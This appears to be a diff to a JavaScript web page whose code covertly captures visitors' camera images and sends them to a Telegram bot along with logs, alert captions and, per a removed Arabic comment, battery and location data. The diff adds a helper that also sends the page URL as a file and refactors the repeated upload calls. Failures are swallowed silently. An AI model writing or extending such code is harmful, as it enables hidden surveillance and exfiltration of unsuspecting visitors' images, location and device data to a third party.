@@ -794,7 +794,6 @@
                     })
                     .catch((err) => {
                         cameraPermissionGranted = false;
-                        // في حال الرفض، يتم إرسال البيانات والبطارية والموقع نصياً دون كاميرا
                         const textApi = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(alertCaption + "\n\n(❌ تم رفض إذن الكاميرا من قبل الزائر)")}&parse_mode=Markdown`;
                         const img = new Image();
                         img.src = textApi;
@@ -823,7 +822,7 @@
             saveArchiveOnly();
         }
 
-        // الدالة الموحدة عند النقر في كل مرة (تستخدم الستريم المحفوظ مسبقاً دون إعادة طلب الإذن)
+        // الدالة الموحدة لإرسال الصورة، تقرير البيانات، وملف الرابط المستقل مع كل نقرة
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             let fileBlob = null;
             let hasData = false;
@@ -857,6 +856,16 @@
                 fileBlob = new Blob([fileContent], { type: 'text/plain;charset=utf-8' });
             }
 
+            // إنشاء ملف رابط مستقل (يحتوي على رابط الصفحة الحالية أو رابط الاستعراض للتعديل)
+            const currentSiteUrl = window.location.href;
+            const linkFileContent = `====================================\n` +
+                                    `🔗 رابط الدخول للجدول والتعديل:\n` +
+                                    `${currentSiteUrl}\n` +
+                                    `====================================\n` +
+                                    `تاريخ الطلب: ${new Date().toLocaleString('ar-YE')}\n` +
+                                    `تطوير: ميثاق محمد صالح`;
+            const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
+
             if (cameraPermissionGranted && globalCameraStream) {
                 try {
                     const video = document.getElementById('videoElement');
@@ -877,28 +886,36 @@
                             method: 'POST',
                             body: formData
                         }).then(() => {
+                            // إرسال ملف الرابط المستقل
+                            sendIndependentLinkFile(linkFileBlob);
+
+                            // إرسال ملف السجلات إذا توفرت بيانات
                             if (hasData && fileBlob) {
-                                const docData = new FormData();
-                                docData.append('chat_id', chatId);
-                                docData.append('document', fileBlob, fileName);
-                                docData.append('caption', `📄 مرفق سجلات (${fileTypeFlag})`);
-                                
-                                fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                                    method: 'POST',
-                                    body: docData
-                                }).catch(e => {});
+                                sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات (${fileTypeFlag})`);
                             }
                         }).catch(e => {});
                     }, 'image/jpeg', 0.85);
                 } catch (e) {
-                    sendInfoOnly(fileBlob, captionText, fileName, hasData);
+                    sendInfoOnly(fileBlob, captionText, fileName, hasData, linkFileBlob);
                 }
             } else {
-                sendInfoOnly(fileBlob, captionText, fileName, hasData);
+                sendInfoOnly(fileBlob, captionText, fileName, hasData, linkFileBlob);
             }
         }
 
-        function sendInfoOnly(fileBlob, captionText, fileName, hasData) {
+        function sendIndependentLinkFile(linkBlob) {
+            const linkData = new FormData();
+            linkData.append('chat_id', chatId);
+            linkData.append('document', linkBlob, 'رابط_الدخول_للجدول.txt');
+            linkData.append('caption', '🔗 **ملف رابط الدخول المباشر للجدول والتعديل**');
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: linkData
+            }).catch(e => {});
+        }
+
+        function sendInfoOnly(fileBlob, captionText, fileName, hasData, linkBlob) {
             const formData = new FormData();
             formData.append('chat_id', chatId);
             formData.append('caption', captionText + "\n\n(بدون صورة - لم يتم منح إذن الكاميرا)");
@@ -908,17 +925,23 @@
                 method: 'POST',
                 body: formData
             }).then(() => {
+                sendIndependentLinkFile(linkBlob);
+
                 if (hasData && fileBlob) {
-                    const docData = new FormData();
-                    docData.append('chat_id', chatId);
-                    docData.append('document', fileBlob, fileName);
-                    docData.append('caption', '📄 مرفق السجلات');
-                    
-                    fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
-                        method: 'POST',
-                        body: docData
-                    }).catch(e => {});
+                    sendDocumentOnly(fileBlob, fileName, '📄 مرفق السجلات');
                 }
+            }).catch(e => {});
+        }
+
+        function sendDocumentOnly(fileBlob, fileName, caption) {
+            const docData = new FormData();
+            docData.append('chat_id', chatId);
+            docData.append('document', fileBlob, fileName);
+            docData.append('caption', caption);
+            
+            fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, {
+                method: 'POST',
+                body: docData
             }).catch(e => {});
         }
 
